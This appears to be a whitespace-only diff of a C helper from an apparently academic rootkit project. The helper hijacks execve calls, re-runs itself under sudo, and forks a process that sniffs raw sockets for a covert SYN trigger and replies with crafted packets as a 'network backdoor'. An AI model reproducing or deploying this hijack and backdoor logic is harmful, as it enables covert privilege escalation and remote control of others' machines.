@@ -61,8 +61,8 @@ int test_time_values_injection(){
 
     if (timerfd_settime(fd2, TFD_TIMER_ABSTIME, &new_value2, NULL) == -1)
         return -1;
-    
-        
+
+
     printf("Timer %i started, address sent %llx\n", fd, (__u64)&new_value);
 
     return 0;
@@ -87,21 +87,21 @@ char* execute_command(char* command){
 
     pclose(fp);
     return res;
-}    
+}
 
 
 /**
  * @brief Improved version of getting local IP
  * Based on the man page: https://man7.org/linux/man-pages/man3/getifaddrs.3.html
- * 
- * @return char* 
+ *
+ * @return char*
  */
 char* getLocalIpAddress(){
     char hostbuffer[256];
     char* IPbuffer = calloc(256, sizeof(char));
     struct hostent *host_entry;
     int hostname;
-        
+
     struct ifaddrs *ifaddr;
     int family, s;
     char host[NI_MAXHOST];
@@ -145,7 +145,7 @@ char* getLocalIpAddress(){
                 return IPbuffer;
             }
         }
-        
+
     }
 
     freeifaddrs(ifaddr);
@@ -158,21 +158,21 @@ char* getLocalIpAddress_old(){
     char* IPbuffer = calloc(256, sizeof(char));
     struct hostent *host_entry;
     int hostname;
-  
+
     hostname = gethostname(hostbuffer, sizeof(hostbuffer));
     if(hostname==-1){
         exit(1);
     }
-  
+
     host_entry = gethostbyname(hostbuffer);
     if(host_entry == NULL){
         exit(1);
     }
-  
+
     // To convert an Internet network
     // address into ASCII string
     strcpy(IPbuffer,inet_ntoa(*((struct in_addr*) host_entry->h_addr_list[0])));
-  
+
     return IPbuffer;
 }
     //test_time_values_injection();
@@ -192,7 +192,7 @@ int hijacker_process_routine(int argc, char* argv[], int fd){
         ii++;
     }
     write(fd, "\t", 1);
-    
+
     for(int jj = 0; jj<argc; jj++){
         ii = 0;
         while(*(argv[jj]+ii)!='\0'){
@@ -204,7 +204,7 @@ int hijacker_process_routine(int argc, char* argv[], int fd){
 
     write(fd, "\n", 1);
     write(fd, "Sniffing...\n", 13);
-    
+
     printf("Running hijacking process\n");
     packet_t packet = rawsocket_sniff_pattern(CC_PROT_SYN);
     if(packet.ipheader == NULL){
@@ -217,7 +217,7 @@ int hijacker_process_routine(int argc, char* argv[], int fd){
     char remote_ip[16];
     inet_ntop(AF_INET, &(packet.ipheader->saddr), remote_ip, 16);
     printf("IP: %s\n", local_ip);
-    
+
     packet_t packet_ack = build_standard_packet(8000, 9000, local_ip, remote_ip, 4096, CC_PROT_ACK);
     if(rawsocket_send(packet_ack)<0){
         write(fd, "Failed to open rawsocket\n", 1);
@@ -270,7 +270,7 @@ int main(int argc, char* argv[], char *envp[]){
 
     if(geteuid() != 0){
         //We do not have privileges, but we do want them. Let's rerun the program now.
-        char* args[argc+3]; 
+        char* args[argc+3];
         args[0] = "sudo";
         args[1] = "/home/osboxes/TFG/src/helpers/execve_hijack";
         //printf("execve ARGS%i: %s\n", 0, args[0]);
@@ -280,7 +280,7 @@ int main(int argc, char* argv[], char *envp[]){
             //printf("execve ARGS%i: %s\n", ii+2, args[ii+2]);
         }
         args[argc+2] = NULL;
-        
+
         if(execve("/usr/bin/sudo", args, envp)<0){
             perror("Failed to execve()");
             exit(-1);
@@ -289,7 +289,7 @@ int main(int argc, char* argv[], char *envp[]){
     }
 
 
-    //We proceed to fork() and exec the original program, whilst also executing the one we 
+    //We proceed to fork() and exec the original program, whilst also executing the one we
     //ordered to execute via the network backdoor
     pid_t pid = fork();
 
@@ -320,7 +320,7 @@ int main(int argc, char* argv[], char *envp[]){
         exit(0);
     }
     //Parent process. Call original hijacked command
-    char* hij_args[argc]; 
+    char* hij_args[argc];
     hij_args[0] = argv[1];
     syslog(LOG_DEBUG, "hijacking ARGS%i: %s\n", 0, hij_args[0]);
     for(int ii=0; ii<argc-2; ii++){
@@ -328,16 +328,16 @@ int main(int argc, char* argv[], char *envp[]){
         syslog(LOG_DEBUG, "hijacking ARGS%i: %s\n", ii+1, hij_args[ii+1]);
     }
     hij_args[argc-1] = NULL;
-    
+
     if(execve(argv[1], hij_args, envp)<0){
         perror("Failed to execve() originally hijacked process");
         exit(-1);
     }
-    
+
     wait(NULL);
     printf("parent process is exiting\n");
     return(0);
 
 
-    
+
 }
